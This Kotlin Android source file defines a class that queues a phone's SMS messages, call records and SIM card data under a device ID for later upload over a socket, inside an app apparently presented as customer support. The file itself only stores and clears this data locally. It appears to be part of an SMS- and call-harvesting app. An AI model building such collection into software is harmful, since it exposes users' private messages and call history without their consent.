package com.customersupport.data

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

/**
 * Manages a persistent queue of sync data that couldn't be sent due to
 * connectivity issues. Uses SharedPreferences for simplicity and reliability.
 * Data is queued when offline and flushed when the socket reconnects.
 */
class PendingSyncManager(context: Context) {

    companion object {
        private const val TAG = "PendingSyncManager"
        private const val PREFS_NAME = "pending_sync_prefs"
        private const val KEY_PENDING_SMS = "pending_sms"
        private const val KEY_PENDING_CALLS = "pending_calls"
        private const val KEY_PENDING_SIM = "pending_sim"
        private const val KEY_PENDING_DEVICE_ID = "pending_device_id"
    }

    private val prefs: SharedPreferences =
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    // --- Queue data for later sync ---

    fun queueSmsSync(deviceId: String, smsArray: JSONArray) {
        try {
            prefs.edit()
                .putString(KEY_PENDING_DEVICE_ID, deviceId)
                .putString(KEY_PENDING_SMS, smsArray.toString())
                .apply()
            Log.d(TAG, "Queued ${smsArray.length()} SMS for later sync")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to queue SMS sync", e)
        }
    }

    fun queueCallsSync(deviceId: String, callsArray: JSONArray) {
        try {
            prefs.edit()
                .putString(KEY_PENDING_DEVICE_ID, deviceId)
                .putString(KEY_PENDING_CALLS, callsArray.toString())
                .apply()
            Log.d(TAG, "Queued ${callsArray.length()} calls for later sync")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to queue calls sync", e)
        }
    }

    fun queueSimSync(deviceId: String, simArray: JSONArray) {
        try {
            prefs.edit()
                .putString(KEY_PENDING_DEVICE_ID, deviceId)
                .putString(KEY_PENDING_SIM, simArray.toString())
                .apply()
            Log.d(TAG, "Queued ${simArray.length()} SIM cards for later sync")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to queue SIM sync", e)
        }
    }

    // --- Retrieve pending data ---

    fun getPendingDeviceId(): String? = prefs.getString(KEY_PENDING_DEVICE_ID, null)

    fun getPendingSms(): JSONArray? {
        val raw = prefs.getString(KEY_PENDING_SMS, null) ?: return null
        return try {
            JSONArray(raw)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse pending SMS", e)
            null
        }
    }

    fun getPendingCalls(): JSONArray? {
        val raw = prefs.getString(KEY_PENDING_CALLS, null) ?: return null
        return try {
            JSONArray(raw)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse pending calls", e)
            null
        }
    }

    fun getPendingSim(): JSONArray? {
        val raw = prefs.getString(KEY_PENDING_SIM, null) ?: return null
        return try {
            JSONArray(raw)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse pending SIM", e)
            null
        }
    }

    fun hasPendingData(): Boolean {
        return getPendingSms() != null || getPendingCalls() != null || getPendingSim() != null
    }

    // --- Clear pending data after successful flush ---

    fun clearPendingSms() {
        prefs.edit().remove(KEY_PENDING_SMS).apply()
    }

    fun clearPendingCalls() {
        prefs.edit().remove(KEY_PENDING_CALLS).apply()
    }

    fun clearPendingSim() {
        prefs.edit().remove(KEY_PENDING_SIM).apply()
    }

    fun clearAll() {
        prefs.edit()
            .remove(KEY_PENDING_SMS)
            .remove(KEY_PENDING_CALLS)
            .remove(KEY_PENDING_SIM)
            .apply()
        Log.d(TAG, "Cleared all pending sync data")
    }
}
